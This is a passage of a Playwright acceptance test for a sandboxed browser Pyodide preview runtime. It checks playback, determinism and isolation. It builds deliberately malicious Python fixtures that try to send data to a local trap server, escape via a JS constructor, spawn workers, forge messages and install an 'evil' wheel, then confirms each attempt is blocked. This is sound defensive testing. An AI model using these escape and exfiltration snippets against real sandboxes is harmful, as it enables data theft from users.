// Real production blob Worker + Pyodide. No Worker/HTTP/Python route fixtures.
import assert from 'node:assert/strict';
import {createServer} from 'node:http';
import {readFile,writeFile,mkdir} from 'node:fs/promises';
import {resolve,dirname} from 'node:path';
import {fileURLToPath} from 'node:url';
import {chromium} from 'playwright';
import {makeFixture,emptyTracePython} from './fixtures.mjs';
import {canonicalPreviewJson, previewSha256} from '../contract.ts';
const root = resolve(dirname(fileURLToPath(import.meta.url)),'../../..');
const out = resolve(process.env.OUTPUT_DIR ?? resolve(root,'.local/browser-preview/acceptance'));
const profiles = JSON.parse(await readFile(process.env.RETAINED_PROFILES ?? new URL('./assets/profiles.json',import.meta.url)));
const staticIndex = JSON.parse(await readFile(resolve(root,'.local/browser-preview/static-index.json')));
const delivery = staticIndex.versions[profiles[0].runtime.assetSha256];
if(!delivery?.frameDocument)throw Error('browser-preview-frame-delivery-missing');
const executionFrames=new Map(staticIndex.assets.filter(a=>a.kind==='frame').map(a=>[a.url,a]));
const fixtures = new Map();
fixtures.set('queue',await makeFixture(profiles[0])); fixtures.set('mesa',await makeFixture(profiles[1],'mesa'));fixtures.set('traffic',await makeFixture(profiles[0],'traffic'));
fixtures.set('fire',await makeFixture(profiles[0],'fire'));
const logs = {app:[],execution:[],trap:[],browser:[],console:[]};
const listen = async handler => {const server=createServer(handler);await new Promise(resolve=>server.listen(0,'0.0.0.0',resolve));return server;};
const send = (res,body,type='text/javascript',headers={}) => {res.writeHead(200,{'Content-Type':type,'Cache-Control':'no-store',...headers});res.end(body);};
const execution = await listen(async(req,res)=>{
  logs.execution.push({url:req.url,cookie:req.headers.cookie??null});
  try {
    const asset=executionFrames.get(req.url);
    if(asset) {
      const csp=`default-src 'none'; script-src 'sha256-${Buffer.from(asset.scriptSha256,'hex').toString('base64')}' 'unsafe-eval' 'wasm-unsafe-eval'; connect-src 'none'; worker-src blob:; frame-ancestors *; base-uri 'none'; form-action 'none'`;
      return send(res,await readFile(resolve(root,'.local/browser-preview/execution-assets',req.url.slice(1))),'text/html',{'Content-Security-Policy':csp,'Permissions-Policy':'camera=(), microphone=(), geolocation=(), usb=(), storage-access=()'});
    }
    res.writeHead(404);res.end('denied');
  }catch(error){res.writeHead(500);res.end(String(error));}
});
const trap = await listen((req,res)=>{logs.trap.push({url:req.url,cookie:req.headers.cookie??null});res.writeHead(200,{'Access-Control-Allow-Origin':'*'});res.end('trap');});
const executionOrigin = `http://127.0.0.1:${execution.address().port}`, trapOrigin = `http://127.0.0.1:${trap.address().port}`;
const app = await listen(async(req,res)=>{
  logs.app.push({url:req.url});
  try {
    if(req.url==='/') return send(res,`<!doctype html><html><head><meta charset="utf-8"><title>Browser runtime acceptance</title><style>#visual{max-width:600px}.preview-cell{height:20px;text-align:center}.preview-lane{padding:10px}button{padding:12px}</style></head><body><h1>Local preview acceptance</h1><div id="visual"></div><div id="metrics"></div><button id="play">Play</button><button id="pause">Pause</button><button id="step">Step</button><button id="restart">Restart</button><script type="module" src="/acceptance-host.mjs"></script></body></html>`,'text/html',{'Set-Cookie':'app_session=sentinel; Path=/; SameSite=Lax'});
    if(req.url==='/host.bundle.mjs') return send(res,await readFile(resolve(root,'.local/browser-preview/app-assets',delivery.hostModule.url.slice(1))));
    if(req.url==='/renderer.mjs') return send(res,await readFile(resolve(root,'.local/browser-preview/app-assets',delivery.rendererModule.url.slice(1))));
    if(req.url==='/protocol.mjs') return send(res,await readFile(new URL('./protocol.mjs',import.meta.url)));
    if(req.url==='/acceptance-host.mjs') return send(res,`import {BrowserPreviewRuntime} from '/host.bundle.mjs';import {PreviewPlayer} from '/renderer.mjs';window.diagnostics=[];window.canvasErrors=[];window.player=new PreviewPlayer(document.querySelector('#visual'),document.querySelector('#metrics'));const runtimeOptions={executionOrigin:${JSON.stringify(executionOrigin)},frameUrl:${JSON.stringify(delivery.frameDocument.url)},assetLoader:async profile=>Promise.all(profile.assetManifest.map(async a=>({path:a.path,bytes:new Uint8Array(await(await fetch('/fixed/'+a.path)).arrayBuffer())}))),onStarted:r=>{window.started=r},onDiagnostic:d=>window.diagnostics.push(d),onCanvasError:e=>{player.clear();window.canvasErrors.push(e.message)}};window.makeRuntime=()=>new BrowserPreviewRuntime(runtimeOptions);window.runtime=makeRuntime();window.loadFixture=async name=>runtime.load(new Uint8Array(await(await fetch('/package/'+name)).arrayBuffer()));window.runFixture=async input=>{window.started=null;player.clear();const trace=await runtime.run(input,document.querySelector('#visual'));window.trace=trace;player.load(trace,runtime.loaded.visualization,runtime.loaded.visualization.renderer==='python-canvas'?index=>runtime.paint(index):null);return trace};for(const action of ['play','pause','step','restart'])document.querySelector('#'+action).onclick=()=>player[action]();window.acceptanceReady=true;`);
    if(req.url.startsWith('/package/')){const value=fixtures.get(req.url.slice(9));if(!value)throw Error('missing fixture');return send(res,canonicalPreviewJson(value),'application/json');}
    if(req.url.startsWith('/fixed/')){const path=req.url.slice(7),asset=profiles.flatMap(p=>p.assetManifest).find(a=>a.path===path);if(!asset)throw Error('asset denied');return send(res,await readFile(resolve(root,'.local/browser-preview/app-assets/browser-preview-assets',asset.sha256,path)),'application/octet-stream');}
    res.writeHead(404);res.end('denied');
  }catch(error){res.writeHead(500);res.end(String(error));}
});
const appOrigin = `http://localhost:${app.address().port}`;
await mkdir(out,{recursive:true});
let browser; const evidence={profiles:profiles.map(p=>p.runtime),cases:[]};
try {
  browser=await chromium.launch({headless:true,executablePath:process.env.CHROMIUM_PATH??'/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',args:['--no-proxy-server']});
  const page=await browser.newPage({viewport:{width:1000,height:850}});
  page.on('request',r=>logs.browser.push({url:r.url(),method:r.method()}));page.on('console',m=>logs.console.push({type:m.type(),text:m.text()}));page.on('pageerror',e=>logs.console.push({type:'pageerror',text:String(e)}));
  await page.goto(appOrigin);await page.waitForFunction(()=>window.acceptanceReady);
  const load=async name=>page.evaluate(name=>loadFixture(name),name);
  const run=async input=>page.evaluate(input=>runFixture(input),input);
  await load('queue'); const queue=await run({parameters:{},seed:7});assert.equal(queue.model,'python-queue-trace');assert.deepEqual(await run({parameters:{},seed:7}),queue);assert.notDeepEqual(await run({parameters:{},seed:8}),queue);
  await page.click('#step');assert.equal(await page.locator('#visual').getAttribute('data-frame'),'1');await page.click('#play');await page.waitForTimeout(450);await page.click('#pause');const index=await page.locator('#visual').getAttribute('data-frame');await page.waitForTimeout(250);assert.equal(await page.locator('#visual').getAttribute('data-frame'),index);await page.click('#restart');assert.equal(await page.locator('#visual').getAttribute('data-frame'),'0');
  const queue0=await run({parameters:{},seed:0}),queueMax=await run({parameters:{},seed:4294967295});assert.notDeepEqual(queue0,queueMax);
  await page.screenshot({path:resolve(out,'queue.png')});evidence.cases.push({name:'queue-real-playback-replay-seed-boundaries',passed:true});
  await load('mesa');const mesa=await run({parameters:{steps:12},seed:7});assert.equal(mesa.model,'mesa-schelling');assert.equal(await page.locator('canvas.preview-grid').count(),1);assert.deepEqual(await run({parameters:{steps:12},seed:7}),mesa);assert.notDeepEqual(await run({parameters:{steps:12,homophily:0.8},seed:8}),mesa);const mesaZero=await run({parameters:{steps:4},seed:0}),mesaMax=await run({parameters:{steps:4},seed:4294967295});assert.notDeepEqual(mesaZero,mesaMax);await page.screenshot({path:resolve(out,'mesa.png')});evidence.cases.push({name:'mesa-real-grid-ordinary-steps',passed:true});
  if(!process.env.RETAINED_PROFILES){
  await load('traffic');const traffic=await run({parameters:{steps:8,grid_size:15},seed:7});assert.equal(traffic.model,'traffic-python-canvas');
  const trafficCanvas=page.frameLocator('iframe.preview-python-canvas').locator('canvas');await trafficCanvas.waitFor();
  const pixel=async(x,y)=>page.evaluate(async({bytes,x,y})=>{const image=await createImageBitmap(new Blob([Uint8Array.from(bytes)],{type:'image/png'}));const surface=document.createElement('canvas');surface.width=image.width;surface.height=image.height;const ctx=surface.getContext('2d');ctx.drawImage(image,0,0);const rgb=ctx.getImageData(x,y,1,1).data;image.close();return '#'+[...rgb.slice(0,3)].map(v=>v.toString(16).padStart(2,'0')).join('');},{bytes:[...await trafficCanvas.screenshot()],x,y});
  await page.waitForFunction(()=>document.querySelector('#visual')?.dataset.frame==='0');await page.waitForTimeout(100);
  assert.equal(await pixel(20,14),'#86a873');assert.equal(await pixel(300,14),'#3d4651');assert.equal(await pixel(300,210),'#6b7280');assert.equal(await pixel(60,210),'#facc15');assert.equal(await pixel(340,210),'#22c55e');
  await trafficCanvas.screenshot({path:resolve(out,'traffic-frame0.png')});
  await page.click('#step');await page.waitForFunction(()=>document.querySelector('#visual')?.dataset.frame==='1');await page.waitForTimeout(100);assert.equal(await pixel(100,210),'#facc15');assert.equal(await pixel(60,210),'#3d4651');
  await trafficCanvas.click({position:{x:300,y:210}});await page.waitForTimeout(100);assert.equal(await pixel(300,210),'#a855f7');
  await page.click('#play');await page.waitForFunction(()=>Number(document.querySelector('#visual')?.dataset.frame)>=3);await page.click('#pause');const paused=await page.locator('#visual').getAttribute('data-frame');await page.waitForTimeout(300);assert.equal(await page.locator('#visual').getAttribute('data-frame'),paused);await page.click('#restart');await page.waitForFunction(()=>document.querySelector('#visual')?.dataset.frame==='0');
  await page.click('#play');const errorsBefore=logs.console.filter(entry=>entry.type==='pageerror').length;const rerun=await run({parameters:{steps:8,grid_size:15},seed:8});assert.equal(rerun.model,'traffic-python-canvas');await page.waitForTimeout(300);assert.equal(logs.console.filter(entry=>entry.type==='pageerror').length,errorsBefore);assert.equal(await page.locator('iframe.preview-python-canvas').count(),1);
  evidence.cases.push({name:'traffic-python-canvas-real-road-intersection-signal-car-pointer-playback',passed:true,packageIdentity:fixtures.get('traffic').manifest.packageIdentity});
  await page.evaluate(()=>runtime.cancel());assert.equal(await page.locator('iframe.preview-python-canvas').count(),0);evidence.cases.push({name:'traffic-canvas-cancel-removes-opaque-frame',passed:true});
  // Execute the exact Python draw example supplied to Pi, using real Pyodide
  // and an opaque OffscreenCanvas, rather than a mock drawing API.
  await load('fire');const fireInput={parameters:{steps:3,width:4,height:2,density:0.7},seed:7};
  const fire=await run(fireInput);assert.equal(fire.model,'forest-fire-python-canvas');assert.deepEqual(await run(fireInput),fire);
  assert.notDeepEqual(await run({...fireInput,seed:8}),fire);assert.notDeepEqual(await run({...fireInput,parameters:{...fireInput.parameters,density:0}}),fire);
  await run(fireInput);await page.click('#step');await page.waitForFunction(()=>document.querySelector('#visual')?.dataset.frame==='1');await page.waitForTimeout(100);
  assert.equal(await pixel(75,105),'#e5e7eb');assert.equal(await pixel(225,105),'#16a34a');assert.equal(await pixel(375,105),'#ef4444');assert.equal(await pixel(525,105),'#374151');
  await trafficCanvas.screenshot({path:resolve(out,'fire-frame1.png')});
  await page.click('#step');await page.waitForFunction(()=>document.querySelector('#visual')?.dataset.frame==='2');await page.waitForTimeout(100);assert.equal(await pixel(375,105),'#374151');
  await page.click('#restart');await page.waitForFunction(()=>document.querySelector('#visual')?.dataset.frame==='0');await page.waitForTimeout(100);assert.equal(await pixel(375,105),'#16a34a');
  await page.click('#play');await page.waitForFunction(()=>document.querySelector('#visual')?.dataset.frame==='3');await page.click('#pause');
  assert.deepEqual(await page.evaluate(()=>trace.snapshots[3].metrics),fire.snapshots[3].metrics);
  evidence.cases.push({name:'pi-draw-example-real-fire-four-colors-seed-parameter-playback',passed:true,packageIdentity:fixtures.get('fire').manifest.packageIdentity});
  await page.evaluate(()=>runtime.cancel());assert.equal(await page.locator('iframe.preview-python-canvas').count(),0);
  const trafficSource=await readFile(new URL('./fixtures/traffic.py',import.meta.url),'utf8');
  const canvasExfil=`${trafficSource}\ndef draw(snapshot, canvas, event=None):\n    import js\n    js.fetch('${trapOrigin}/canvas-exfil').catch(lambda error: None)\n    js.fetch('${appOrigin}/api/canvas-exfil').catch(lambda error: None)\n    canvas.clear('#ffffff')\n`;
  fixtures.set('canvas-exfil',await makeFixture(profiles[0],'traffic',canvasExfil));await load('canvas-exfil');await run({parameters:{steps:1,grid_size:15},seed:7});await page.waitForTimeout(300);assert.equal(logs.trap.some(r=>r.url.includes('canvas-exfil')),false);assert.equal(logs.app.some(r=>r.url.includes('/api/canvas-exfil')),false);evidence.cases.push({name:'python-canvas-draw-network-denied-by-real-csp',passed:true});
  const forgedPainted=JSON.stringify({schema:'riffology.browser-runtime/v1',type:'painted',requestId:'local-1',packageIdentity:'0'.repeat(64),sequence:999,index:0,token:999});
  const canvasEscape=`${trafficSource}\ndef draw(snapshot, canvas, event=None):\n    root = canvas.clear.constructor('return self')()\n    root.fetch('${trapOrigin}/canvas-constructor-exfil').catch(lambda error: None)\n    root.fetch('${appOrigin}/api/canvas-constructor-exfil').catch(lambda error: None)\n    try: root.Worker.new('${executionOrigin}/exfil-worker.mjs')\n    except Exception: pass\n    root.postMessage(root.JSON.parse(${JSON.stringify(forgedPainted)}))\n    canvas.clear('#ffffff')\n`;
  fixtures.set('canvas-constructor',await makeFixture(profiles[0],'traffic',canvasEscape));await load('canvas-constructor');await run({parameters:{steps:1,grid_size:15},seed:7});await page.waitForTimeout(300);assert.equal(logs.trap.some(r=>r.url.includes('canvas-constructor-exfil')),false);assert.equal(logs.app.some(r=>r.url.includes('/api/canvas-constructor-exfil')),false);assert.equal(logs.execution.some(r=>r.url.includes('exfil-worker')),false);assert.equal(await page.evaluate(()=>window.canvasErrors.length),0);evidence.cases.push({name:'python-canvas-js-constructor-csp-contained-wrong-identity-ack-ignored',passed:true});
  const canvasLargeMessage=`${trafficSource}\ndef draw(snapshot, canvas, event=None):\n    root = canvas.clear.constructor('return self')()\n    root.postMessage('x' * 1048576)\n    canvas.clear('#13579b')\n`;
  fixtures.set('canvas-large-message',await makeFixture(profiles[0],'traffic',canvasLargeMessage));await load('canvas-large-message');await run({parameters:{steps:1,grid_size:15},seed:7});await page.waitForTimeout(200);assert.equal(await pixel(20,14),'#13579b');assert.equal(await page.locator('iframe.preview-python-canvas').count(),1);evidence.cases.push({name:'python-canvas-oversize-worker-message-dropped-before-app-port',passed:true});
  const canvasMessageBurst=`${trafficSource}\ndef draw(snapshot, canvas, event=None):\n    root = canvas.clear.constructor('return self')()\n    for _ in range(40): root.postMessage('unexpected')\n    canvas.clear('#13579b')\n`;
  fixtures.set('canvas-message-burst',await makeFixture(profiles[0],'traffic',canvasMessageBurst));await load('canvas-message-burst');await run({parameters:{steps:1,grid_size:15},seed:7});await page.waitForFunction(()=>window.canvasErrors.includes('runtime-worker-message-invalid'));assert.equal(await page.locator('iframe.preview-python-canvas').count(),0);await load('queue');assert.deepEqual(await run({parameters:{},seed:7}),queue);evidence.cases.push({name:'python-canvas-worker-message-burst-terminates-session-and-next-run-recovers',passed:true});
  const canvasHang=`${trafficSource}\ndef draw(snapshot, canvas, event=None):\n    root = canvas.clear.constructor('return self')()\n    root.postMessage(root.JSON.parse(${JSON.stringify(forgedPainted)}))\n    while True: pass\n`;
  fixtures.set('canvas-hang',await makeFixture(profiles[0],'traffic',canvasHang));await load('canvas-hang');await page.evaluate(()=>runtime.canvasPaintMs=700);await run({parameters:{steps:1,grid_size:15},seed:7});await page.waitForFunction(()=>window.canvasErrors.includes('runtime-canvas-paint-timeout'),undefined,{timeout:3000});assert.equal(await page.locator('iframe.preview-python-canvas').count(),0);await load('queue');assert.deepEqual(await run({parameters:{},seed:7}),queue);evidence.cases.push({name:'python-canvas-stuck-draw-killed-and-next-package-safe',passed:true});
  await load('canvas-hang');const playTimeoutsBefore=await page.evaluate(()=>window.canvasErrors.filter(value=>value==='runtime-canvas-paint-timeout').length);await run({parameters:{steps:30,grid_size:15},seed:7});await page.click('#play');await page.waitForFunction(before=>window.canvasErrors.filter(value=>value==='runtime-canvas-paint-timeout').length>before,playTimeoutsBefore,{timeout:3000});assert.equal(await page.locator('iframe.preview-python-canvas').count(),0);evidence.cases.push({name:'python-canvas-playback-does-not-reset-stuck-paint-deadline',passed:true});
  const pointerHang=`${trafficSource}\ndef draw(snapshot, canvas, event=None):\n    canvas.clear('#13579b')\n    if event is not None:\n        while True: pass\n`;
  fixtures.set('canvas-pointer-hang',await makeFixture(profiles[0],'traffic',pointerHang));await load('canvas-pointer-hang');const pointerTimeoutsBefore=await page.evaluate(()=>window.canvasErrors.filter(value=>value==='runtime-canvas-paint-timeout').length);await run({parameters:{steps:1,grid_size:15},seed:7});await page.waitForTimeout(100);await page.frameLocator('iframe.preview-python-canvas').locator('canvas').click({position:{x:300,y:210}});await page.waitForFunction(before=>window.canvasErrors.filter(value=>value==='runtime-canvas-paint-timeout').length>before,pointerTimeoutsBefore,{timeout:3000});assert.equal(await page.locator('iframe.preview-python-canvas').count(),0);await load('queue');assert.deepEqual(await run({parameters:{},seed:7}),queue);await page.evaluate(()=>runtime.canvasPaintMs=10000);evidence.cases.push({name:'python-canvas-pointer-draw-has-paint-deadline-and-next-package-safe',passed:true});
  const exactAckHandler=`if(event.data?.type==='paint'){const d=event.data;self.postMessage({schema:d.schema,type:'painted',requestId:d.requestId,packageIdentity:d.packageIdentity,sequence:d.sequence,index:d.index,token:d.token})}`;
  const canvasForgedAck=`${trafficSource}\ndef draw(snapshot, canvas, event=None):\n    root = canvas.clear.constructor('return self')()\n    root.onmessage = root.Function('event', ${JSON.stringify(exactAckHandler)})\n    canvas.clear('#ffffff')\n    canvas.rect(0, 0, 40, 28, '#123456')\n`;
  fixtures.set('canvas-forged-ack',await makeFixture(profiles[0],'traffic',canvasForgedAck));await load('canvas-forged-ack');await page.evaluate(()=>runtime.canvasSessionMs=12000);const paintTimeoutsBefore=await page.evaluate(()=>window.canvasErrors.filter(value=>value==='runtime-canvas-paint-timeout').length);await run({parameters:{steps:2,grid_size:15},seed:7});await page.waitForTimeout(100);assert.equal(await pixel(20,14),'#123456');await page.click('#step');await page.waitForTimeout(300);assert.equal(await pixel(20,14),'#123456');assert.equal(await page.evaluate(()=>window.canvasErrors.filter(value=>value==='runtime-canvas-paint-timeout').length),paintTimeoutsBefore);await page.waitForFunction(()=>window.canvasErrors.includes('runtime-canvas-session-timeout'),undefined,{timeout:15000});assert.equal(await page.locator('iframe.preview-python-canvas').count(),0);await page.evaluate(()=>runtime.canvasSessionMs=120000);evidence.cases.push({name:'python-canvas-exact-forged-ack-cannot-extend-absolute-session',passed:true});
  }
  const legacyAdapter=await readFile(resolve(root,'tests/fixtures/preview-legacy-run.py'),'utf8');
  // Each new page has a fresh browser context; refresh must reload the same frozen package.
  for(const name of ['queue','mesa']) {
    const reopened=await browser.newPage();
    try {
      await reopened.goto(appOrigin);await reopened.waitForFunction(()=>window.acceptanceReady);
      for(const phase of ['cold-independent-page','refresh']) {
        if(phase==='refresh'){await reopened.reload();await reopened.waitForFunction(()=>window.acceptanceReady);}
        const trace=await reopened.evaluate(async name=>{await loadFixture(name);return runFixture({parameters:name==='mesa'?{steps:12}:{},seed:7});},name);
        assert.deepEqual(trace,name==='mesa'?mesa:queue);evidence.cases.push({name:name+'-'+phase,passed:true});
      }
    } finally {await reopened.close();}
  }
  for(const [i,name] of ['queue','mesa'].entries()){
    fixtures.set('legacy-'+name,await makeFixture(profiles[i],name,null,legacyAdapter));await load('legacy-'+name);
    const input={parameters:name==='mesa'?{steps:12}:{},seed:7},legacy=await run(input);
    assert.deepEqual(legacy,name==='mesa'?mesa:queue);assert.deepEqual(await run(input),legacy);
    evidence.cases.push({name:'legacy-platform-adapter-real-'+name,passed:true});
  }
  await load('mesa');
  const rendererLimit=await page.evaluate(()=>{const start=performance.now();player.load({model:'legal-extreme-grid',snapshots:[{schemaVersion:'riffology.visual/v0.1',frame:0,time:0,space:{type:'grid',width:1000000,height:1},agents:Array.from({length:10000},(_,i)=>({id:String(i),type:'resident',state:'group-a',x:i,y:0})),metrics:{population:10000}}]},{renderer:'grid',metricKeys:['population']});return {ms:performance.now()-start,nodes:document.querySelector('#visual').childElementCount,width:document.querySelector('canvas').width,height:document.querySelector('canvas').height}});assert.equal(rendererLimit.nodes,1);assert.equal(rendererLimit.width,600);assert.equal(rendererLimit.height,420);assert(rendererLimit.ms<1000);evidence.cases.push({name:'legal-million-cell-grid-fixed-canvas',passed:true,...rendererLimit});
  for(const [name,input] of [['seed-overflow',{parameters:{},seed:4294967296}],['unknown-param',{parameters:{evil:1},seed:7}],['out-of-range',{parameters:{homophily:2},seed:7}],['top-steps',{parameters:{},seed:7,steps:12}]]){await assert.rejects(run(input));evidence.cases.push({name,passed:true});}
  const poisoned=structuredClone(fixtures.get('queue'));poisoned.files[0].base64=Buffer.from('tampered').toString('base64');fixtures.set('tampered',poisoned);await assert.rejects(load('tampered'),/mismatch/);assert.equal(await page.evaluate(()=>runtime.loaded.manifest.packageIdentity),fixtures.get('mesa').manifest.packageIdentity);evidence.cases.push({name:'tampered-source-keeps-valid-package',passed:true});
  // Malicious generated Python is actually executed, including import js.
  const calls=[['fetch',`import js\njs.fetch('${trapOrigin}/fetch').catch(lambda error: None)`],['app-api',`import js\njs.fetch('${appOrigin}/api/private').catch(lambda error: None)`],['xhr',`import js\nx=js.XMLHttpRequest.new()\nx.open('GET','${trapOrigin}/xhr')\ntry: x.send()\nexcept Exception: pass`],['websocket',`import js\ntry: js.WebSocket.new('${trapOrigin.replace('http','ws')}/ws')\nexcept Exception: pass`],['eventsource',`import js\ntry: js.EventSource.new('${trapOrigin}/events')\nexcept Exception: pass`],['dynamic-import-trap',`import js\njs.eval("import('${trapOrigin}/module.mjs').catch(()=>{})")`],['dynamic-import-same-origin',`import js\njs.eval("import('${executionOrigin}/exfil?q=source').catch(()=>{})")`],['subworker',`import js\ntry: js.Worker.new('${executionOrigin}/exfil-worker.mjs')\nexcept Exception: pass`],['blob-subworker',`import json, js\nraw=js.eval("""(()=>{let url=null;const locked=()=>{const d=Object.getOwnPropertyDescriptor(self,'Worker');return Boolean(d&&!d.configurable&&!d.writable)};try{const blob=new Blob(['postMessage(\\"nested\\")'],{type:'text/javascript'});url=URL.createObjectURL(blob);const child=new Worker(url);child.terminate();return JSON.stringify({created:true,locked:locked(),error:''})}catch(error){return JSON.stringify({created:false,locked:locked(),error:String(error?.message??error)})}finally{if(url)URL.revokeObjectURL(url)}})()""")\nprobe=json.loads(str(raw))\nif probe['created'] or not probe['locked'] or 'runtime-subworker-denied' not in probe['error']: raise ValueError('blob-subworker-not-denied')`],['forged-connected',`import js\njs.postMessage(js.JSON.parse('{"type":"connected"}'))`],['forged-window-message',`import js\njs.postMessage(js.JSON.parse('{"type":"verify","metrics":{"forged":999}}'))`]];
  for(const [name,code]of calls){const body=code.split('\n').map(l=>'    '+l).join('\n');fixtures.set(name,await makeFixture(profiles[0],'queue',`def run(config):\n${body}\n    ${emptyTracePython}\n`));await load(name);await run({parameters:{},seed:1});evidence.cases.push({name:'malicious-'+name,passed:true});}
  fixtures.set('micropip',await makeFixture(profiles[1],'queue',`async def run(config):\n    import micropip, js\n    attempted=False\n    try: await micropip.install('${trapOrigin}/evil-1.0-py3-none-any.whl')\n    except Exception as error:\n        attempted=True\n        js.console.log('micropip-install-awaited-denied',str(error))\n    if not attempted: raise ValueError('micropip-not-denied')\n    ${emptyTracePython}\n`));await load('micropip');await run({parameters:{},seed:1});assert(logs.console.some(m=>m.text.includes('micropip-install-awaited-denied')));evidence.cases.push({name:'malicious-micropip-real-installed-awaited-denial',passed:true});
  fixtures.set('infinite',await makeFixture(profiles[0],'queue',`def run(config):\n    while True: pass\n`));await load('infinite');await page.evaluate(()=>{window.pendingOutcome=runFixture({parameters:{},seed:1}).then(()=>({ok:true}),e=>({error:e.message}))});await page.waitForFunction(()=>window.started);const isolatedFrame=page.frames().find(f=>f.url().startsWith(executionOrigin));const frameBoundary=await isolatedFrame.evaluate(()=>{let parentDenied=false,cookieDenied=false,cookie='';try{parent.document.body}catch{parentDenied=true}try{cookie=document.cookie}catch{cookieDenied=true}return {parentDenied,cookieDenied,cookie,origin:self.origin}});assert.equal(frameBoundary.parentDenied,true);assert.equal(frameBoundary.cookie,'');assert.equal(frameBoundary.origin,'null');evidence.cases.push({name:'opaque-frame-parent-dom-and-app-cookie-denied',passed:true,...frameBoundary});await page.evaluate(()=>runtime.cancel());assert.equal((await page.evaluate(()=>pendingOutcome)).error,'runtime-cancelled');await load('queue');assert.deepEqual(await run({parameters:{},seed:7}),queue);evidence.cases.push({name:'cancel-infinite-next-valid-run',passed:true});
  await load('infinite');await page.evaluate(()=>{runtime.timeoutMs=8000;window.pendingOutcome=runFixture({parameters:{},seed:1}).then(()=>({ok:true}),e=>({error:e.message}))});assert.equal((await page.evaluate(()=>pendingOutcome)).error,'runtime-timeout');await load('queue');await page.evaluate(()=>runtime.timeoutMs=30000);assert.deepEqual(await run({parameters:{},seed:7}),queue);evidence.cases.push({name:'timeout-infinite-next-valid-run',passed:true});
  fixtures.set('oversized',await makeFixture(profiles[0],'queue',`def run(config):\n    return {'model':'x'*9000000,'snapshots':[]}\n`));await load('oversized');await assert.rejects(run({parameters:{},seed:1}),/output-limit/);evidence.cases.push({name:'python-output-limit-before-postMessage',passed:true});
  fixtures.set('oversized-monkeypatch',await makeFixture(profiles[0],'queue',`import builtins\ndef run(config):\n    builtins.len=lambda value: 0\n    return {'model':'x'*9000000,'snapshots':[]}\n`));await load('oversized-monkeypatch');await assert.rejects(run({parameters:{},seed:1}),/output-limit/);await load('queue');assert.deepEqual(await run({parameters:{},seed:7}),queue);evidence.cases.push({name:'js-output-limit-survives-python-len-monkeypatch',passed:true});
  fixtures.set('input-monkeypatch',await makeFixture(profiles[0],'queue',`import json\njson.loads=lambda value: {'parameters':{},'seed':999}\ndef run(config):\n    if config['seed'] != 7: raise ValueError('runtime-input-monkeypatched')\n    ${emptyTracePython}\n`));await load('input-monkeypatch');await run({parameters:{},seed:7});evidence.cases.push({name:'trusted-input-parser-captured-before-model-import',passed:true});
  fixtures.set('storage-probe',await makeFixture(profiles[0],'queue',`import json, js
async def run(config):
    raw = await js.eval("""(async()=>{
      const blocked=async action=>{try{await action();return false}catch{return true}};
      const indexed=await blocked(()=>new Promise((resolve,reject)=>{const request=indexedDB.open('riffology-isolation');request.onerror=()=>reject(request.error);request.onsuccess=()=>{request.result.close();resolve()}}));
      const cache=await blocked(()=>caches.open('riffology-isolation'));
      const opfs=await blocked(()=>navigator.storage.getDirectory());
      let broadcast=false;try{const channel=new BroadcastChannel('riffology-isolation');channel.close()}catch{broadcast=true}
      return JSON.stringify({indexed,cache,opfs,broadcast,origin:self.origin});
    })()""")
    probe = json.loads(str(raw))
    if probe != {'indexed': True, 'cache': True, 'opfs': True, 'broadcast': False, 'origin': 'null'}:
        raise ValueError('runtime-storage-isolation-failed:'+json.dumps(probe,sort_keys=True))
    ${emptyTracePython}
`));await load('storage-probe');await run({parameters:{},seed:1});await load('storage-probe');await run({parameters:{},seed:2});evidence.cases.push({name:'opaque-worker-persistent-storage-apis-denied-across-runs',passed:true});
  fixtures.set('broadcast-probe',await makeFixture(profiles[0],'queue',`import json, js
async def run(config):
    raw = await js.eval("""new Promise(resolve=>{
      let received=false,channel;
      try{channel=new BroadcastChannel('riffology-isolation')}catch{resolve(JSON.stringify({constructed:false,received:false,origin:self.origin}));return}
      channel.onmessage=()=>{received=true};
      const timer=setInterval(()=>channel.postMessage('sentinel'),25);
      setTimeout(()=>{clearInterval(timer);channel.close();resolve(JSON.stringify({constructed:true,received,origin:self.origin}))},1200);
    })""")
    probe = json.loads(str(raw))
    if probe != {'constructed': True, 'received': False, 'origin': 'null'}:
        raise ValueError('runtime-broadcast-isolation-failed:'+json.dumps(probe,sort_keys=True))
    ${emptyTracePython}
`));await page.evaluate(async()=>{const bytes=new Uint8Array(await(await fetch('/package/broadcast-probe')).arrayBuffer()),left=makeRuntime(),right=makeRuntime();try{await Promise.all([left.load(bytes),right.load(bytes)]);await Promise.all([left.run({parameters:{},seed:1}),right.run({parameters:{},seed:2})]);}finally{left.dispose();right.dispose();}});evidence.cases.push({name:'opaque-worker-broadcastchannel-separated-concurrent-runs',passed:true});
  await load('infinite');await page.evaluate(()=>{window.pendingOutcome=runFixture({parameters:{},seed:1}).then(()=>({ok:true}),e=>({error:e.message}))});await page.waitForFunction(()=>window.started);await page.evaluate(async()=>{const original=runtime.assetLoader,cached=[...runtime.assets].map(([path,bytes])=>({path,bytes}));let release;runtime.assetLoader=()=>new Promise(resolve=>{release=()=>resolve(cached)});const slow=loadFixture('queue').then(()=>({ok:true}),e=>({error:e.message}));await new Promise(resolve=>setTimeout(resolve,50));runtime.assetLoader=original;await loadFixture('mesa');release();window.raceResult=await slow;});assert.equal((await page.evaluate(()=>pendingOutcome)).error,'runtime-cancelled');assert.equal(await page.evaluate(()=>raceResult.error),'runtime-load-superseded');assert.equal(await page.evaluate(()=>runtime.loaded.manifest.packageIdentity),fixtures.get('mesa').manifest.packageIdentity);evidence.cases.push({name:'late-asset-loader-cannot-overwrite-new-package',passed:true});
  // Pending input/package ids do not admit late result messages.
  await page.evaluate(()=>window.postMessage({schema:'riffology.browser-runtime/v1',type:'result',requestId:'local-1',packageIdentity:'a'.repeat(64),trace:{}},'*'));await page.waitForTimeout(200);assert.equal(await page.evaluate(()=>runtime.pending),null);evidence.cases.push({name:'external-postMessage-cannot-submit-or-render',passed:true});
  evidence.cspDiagnostics=await page.evaluate(()=>window.diagnostics);for(const directive of ['connect-src','script-src-elem'])assert(evidence.cspDiagnostics.some(d=>d.directive===directive),directive+' violation must be observed');assert(evidence.cspDiagnostics.some(d=>d.directive==='script-src-elem' && d.blockedURI.startsWith(executionOrigin+'/exfil')), 'same origin import denied by CSP');
